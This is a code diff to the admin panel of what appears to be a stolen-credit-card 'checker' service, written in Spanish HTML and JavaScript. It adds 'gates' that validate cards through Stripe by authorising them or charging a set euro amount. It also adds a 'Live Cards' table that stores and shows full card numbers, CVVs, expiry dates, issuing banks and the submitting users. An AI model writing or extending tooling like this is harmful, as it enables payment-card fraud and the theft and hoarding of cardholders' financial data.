@@ -423,7 +423,16 @@
                         <input type="password" id="stripe-sk" placeholder="sk_live_..." required>
                     </div>
                 </div>
-                <div class="form-group">
+                
+                <!-- Configuración de Gates -->
+                <div style="margin-top: 25px; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px solid #e0e0e0;">
+                    <h3 style="margin-bottom: 15px; color: #667eea;">🎯 Configuración de Gates</h3>
+                    <div id="gates-config-container">
+                        <!-- Los gates se cargarán dinámicamente aquí -->
+                    </div>
+                </div>
+                
+                <div class="form-group" style="margin-top: 20px;">
                     <label style="display: flex; align-items: center; gap: 10px;">
                         <label class="toggle-switch">
                             <input type="checkbox" id="maintenance-mode">
@@ -466,6 +475,59 @@
                 </tbody>
             </table>
         </div>
+
+        <!-- Tarjetas Guardadas (Live Cards) -->
+        <div class="section">
+            <div class="section-header">
+                <h2>💳 Tarjetas Guardadas (Live Cards)</h2>
+                <div style="display: flex; gap: 10px; align-items: center;">
+                    <button onclick="loadSavedCards('all')" class="btn btn-secondary">🔄 Recargar</button>
+                    <select id="card-mode-filter" onchange="loadSavedCards(this.value)" style="padding: 8px 15px; border-radius: 8px; border: 1px solid #ddd; font-size: 14px;">
+                        <option value="all">Todas</option>
+                        <option value="auth">Solo Auth</option>
+                        <option value="charge">Solo Charged</option>
+                    </select>
+                </div>
+            </div>
+            <div id="cards-message" class="message"></div>
+            <div style="display: flex; gap: 15px; margin-bottom: 20px;">
+                <div style="padding: 15px; background: #e0f2fe; border-radius: 10px; flex: 1;">
+                    <div style="font-size: 12px; color: #0369a1; margin-bottom: 5px;">Tarjetas Auth</div>
+                    <div style="font-size: 24px; font-weight: bold; color: #0284c7;" id="stat-auth-cards">0</div>
+                </div>
+                <div style="padding: 15px; background: #fce7f3; border-radius: 10px; flex: 1;">
+                    <div style="font-size: 12px; color: #9f1239; margin-bottom: 5px;">Tarjetas Charged</div>
+                    <div style="font-size: 24px; font-weight: bold; color: #be185d;" id="stat-charge-cards">0</div>
+                </div>
+            </div>
+            <div style="overflow-x: auto;">
+                <table class="keys-table" id="cards-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Modo</th>
+                            <th>Número</th>
+                            <th>CVV</th>
+                            <th>Expiración</th>
+                            <th>Marca/Tipo</th>
+                            <th>País</th>
+                            <th>Banco</th>
+                            <th>Monto</th>
+                            <th>Usuario</th>
+                            <th>Fecha</th>
+                            <th>Acciones</th>
+                        </tr>
+                    </thead>
+                    <tbody id="cards-tbody">
+                        <tr>
+                            <td colspan="12" style="text-align: center; padding: 30px; color: #999;">
+                                Cargando tarjetas...
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
     </div>
 
     <!-- Modal para generar key -->
@@ -507,12 +569,28 @@
                 const data = await response.json();
                 
                 currentConfig = data.config;
+                currentConfig.gates_config = data.gates_config || {};
+                const gatesConfig = currentConfig.gates_config;
                 
                 // Llenar formulario
                 document.getElementById('stripe-pk').value = currentConfig.stripe_pk || '';
                 document.getElementById('stripe-sk').value = currentConfig.stripe_sk || '';
                 document.getElementById('max-checks').value = currentConfig.max_checks_per_day || 50;
-                document.getElementById('maintenance-mode').checked = currentConfig.maintenance_mode || false;
+                
+                // Corregir mantenimiento: parsear correctamente el valor booleano
+                const maintenanceMode = currentConfig.maintenance_mode;
+                let maintenanceEnabled = false;
+                if (typeof maintenanceMode === 'boolean') {
+                    maintenanceEnabled = maintenanceMode;
+                } else if (typeof maintenanceMode === 'string') {
+                    maintenanceEnabled = maintenanceMode.toLowerCase() === 'true';
+                } else {
+                    maintenanceEnabled = Boolean(maintenanceMode);
+                }
+                document.getElementById('maintenance-mode').checked = maintenanceEnabled;
+                
+                // Cargar gates dinámicamente
+                renderGatesConfig(gatesConfig);
                 
                 // Actualizar estadísticas
                 document.getElementById('stat-total-keys').textContent = data.stats.total_keys;
@@ -522,16 +600,85 @@
                 console.error('Error cargando configuración:', error);
             }
         }
+        
+        // Renderizar configuración de gates dinámicamente
+        function renderGatesConfig(gatesConfig) {
+            const container = document.getElementById('gates-config-container');
+            if (!container) return;
+            
+            let html = '<div class="form-grid">';
+            
+            // Iterar sobre todos los gates
+            for (const [gateId, gateConfig] of Object.entries(gatesConfig)) {
+                const gateName = gateConfig.name || gateId;
+                const gateIcon = gateConfig.icon || '⚙️';
+                const gateDescription = gateConfig.description || '';
+                const enabled = gateConfig.enabled !== false; // Por defecto true si no está definido
+                
+                html += `
+                    <div class="form-group">
+                        <label style="display: flex; align-items: center; gap: 10px;">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="gate-${gateId}-enabled" ${enabled ? 'checked' : ''}>
+                                <span class="toggle-slider"></span>
+                            </label>
+                            ${gateIcon} Gate ${gateName}
+                        </label>
+                        <small>${gateDescription || 'Configuración del gate ' + gateName}</small>
+                    </div>
+                `;
+            }
+            
+            html += '</div>';
+            
+            // Agregar campo de monto solo si existe el gate charge
+            if (gatesConfig.charge && gatesConfig.charge.amount !== undefined) {
+                html += `
+                    <div class="form-group" style="margin-top: 15px;">
+                        <label>Monto del Cargo (EUR)</label>
+                        <input type="number" id="charge-amount-eur" min="0.01" max="100" step="0.01" value="${gatesConfig.charge.amount || '1.00'}" required>
+                        <small>Monto que se cobrará cuando se use el gate Charged (en euros)</small>
+                    </div>
+                `;
+            }
+            
+            container.innerHTML = html;
+        }
 
         // Guardar configuración
         document.getElementById('config-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
+            // Obtener configuración actual de gates
+            let gatesConfig = currentConfig.gates_config || {};
+            if (!gatesConfig || Object.keys(gatesConfig).length === 0) {
+                // Si no hay gates_config en currentConfig, cargarlo desde el servidor
+                const response = await fetch('/admin/get_config');
+                const data = await response.json();
+                gatesConfig = data.gates_config || {};
+                currentConfig.gates_config = gatesConfig;
+            }
+            
+            // Actualizar estado enabled de cada gate
+            for (const gateId in gatesConfig) {
+                const checkbox = document.getElementById(`gate-${gateId}-enabled`);
+                if (checkbox) {
+                    gatesConfig[gateId].enabled = checkbox.checked;
+                }
+            }
+            
+            // Actualizar monto de charge si existe
+            const chargeAmountInput = document.getElementById('charge-amount-eur');
+            if (chargeAmountInput && gatesConfig.charge) {
+                gatesConfig.charge.amount = parseFloat(chargeAmountInput.value);
+            }
+            
             const configData = {
                 stripe_pk: document.getElementById('stripe-pk').value,
                 stripe_sk: document.getElementById('stripe-sk').value,
                 max_checks_per_day: parseInt(document.getElementById('max-checks').value),
-                maintenance_mode: document.getElementById('maintenance-mode').checked
+                maintenance_mode: document.getElementById('maintenance-mode').checked,
+                gates_config: gatesConfig
             };
 
             const adminPassword = document.getElementById('admin-password').value;
@@ -740,9 +887,113 @@
             }
         }
 
+        // Cargar tarjetas guardadas
+        async function loadSavedCards(mode = 'all') {
+            try {
+                const url = mode === 'all' ? '/admin/get_saved_cards' : `/admin/get_saved_cards?mode=${mode}`;
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                if (data.success) {
+                    const tbody = document.getElementById('cards-tbody');
+                    const authCount = data.auth_count || 0;
+                    const chargeCount = data.charge_count || 0;
+                    
+                    // Actualizar estadísticas
+                    document.getElementById('stat-auth-cards').textContent = authCount;
+                    document.getElementById('stat-charge-cards').textContent = chargeCount;
+                    
+                    if (data.cards.length === 0) {
+                        tbody.innerHTML = `
+                            <tr>
+                                <td colspan="12" style="text-align: center; padding: 30px; color: #999;">
+                                    No hay tarjetas guardadas ${mode !== 'all' ? `(modo: ${mode})` : ''}
+                                </td>
+                            </tr>
+                        `;
+                    } else {
+                        tbody.innerHTML = data.cards.map(card => {
+                            const date = new Date(card.created_at);
+                            const formattedDate = date.toLocaleString('es-ES', {
+                                year: 'numeric',
+                                month: '2-digit',
+                                day: '2-digit',
+                                hour: '2-digit',
+                                minute: '2-digit'
+                            });
+                            
+                            const modeBadge = card.mode === 'auth' 
+                                ? '<span style="background: #0284c7; color: white; padding: 4px 8px; border-radius: 4px; font-size: 11px;">AUTH</span>'
+                                : '<span style="background: #be185d; color: white; padding: 4px 8px; border-radius: 4px; font-size: 11px;">CHARGED</span>';
+                            
+                            const amountDisplay = card.amount 
+                                ? `€${parseFloat(card.amount).toFixed(2)}`
+                                : '-';
+                            
+                            const countryDisplay = card.country_emoji && card.country_name
+                                ? `${card.country_emoji} ${card.country_name}`
+                                : card.card_country || '-';
+                            
+                            return `
+                                <tr>
+                                    <td><strong>#${card.id}</strong></td>
+                                    <td>${modeBadge}</td>
+                                    <td><code style="background: #f3f4f6; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${card.card_number}</code></td>
+                                    <td><code style="background: #f3f4f6; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${card.cvv}</code></td>
+                                    <td>${card.exp_month}/${card.exp_year}</td>
+                                    <td>${card.card_brand || '-'} ${card.card_type ? `(${card.card_type})` : ''}</td>
+                                    <td>${countryDisplay}</td>
+                                    <td>${card.bank_name || '-'}</td>
+                                    <td><strong>${amountDisplay}</strong></td>
+                                    <td>${card.user_name || 'N/A'}</td>
+                                    <td><small>${formattedDate}</small></td>
+                                    <td>
+                                        <button onclick="deleteSavedCard(${card.id})" class="btn btn-small btn-danger" title="Eliminar tarjeta">
+                                            🗑️
+                                        </button>
+                                    </td>
+                                </tr>
+                            `;
+                        }).join('');
+                    }
+                } else {
+                    showMessage('cards-message', '❌ Error al cargar tarjetas', 'error');
+                }
+            } catch (error) {
+                console.error('Error cargando tarjetas:', error);
+                showMessage('cards-message', '❌ Error al cargar tarjetas', 'error');
+            }
+        }
+
+        // Eliminar tarjeta guardada
+        async function deleteSavedCard(cardId) {
+            if (!confirm('¿Estás seguro de eliminar esta tarjeta guardada? Esta acción no se puede deshacer.')) return;
+
+            try {
+                const response = await fetch('/admin/delete_saved_card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ card_id: cardId })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    showMessage('cards-message', '✅ Tarjeta eliminada', 'success');
+                    const currentFilter = document.getElementById('card-mode-filter').value;
+                    await loadSavedCards(currentFilter);
+                } else {
+                    showMessage('cards-message', '❌ Error al eliminar tarjeta', 'error');
+                }
+            } catch (error) {
+                showMessage('cards-message', '❌ Error al eliminar tarjeta', 'error');
+            }
+        }
+
         // Cargar todo al iniciar
         loadConfig();
         loadKeys();
+        loadSavedCards('all');
 
         // Recargar keys cada 30 segundos
         setInterval(loadKeys, 30000);
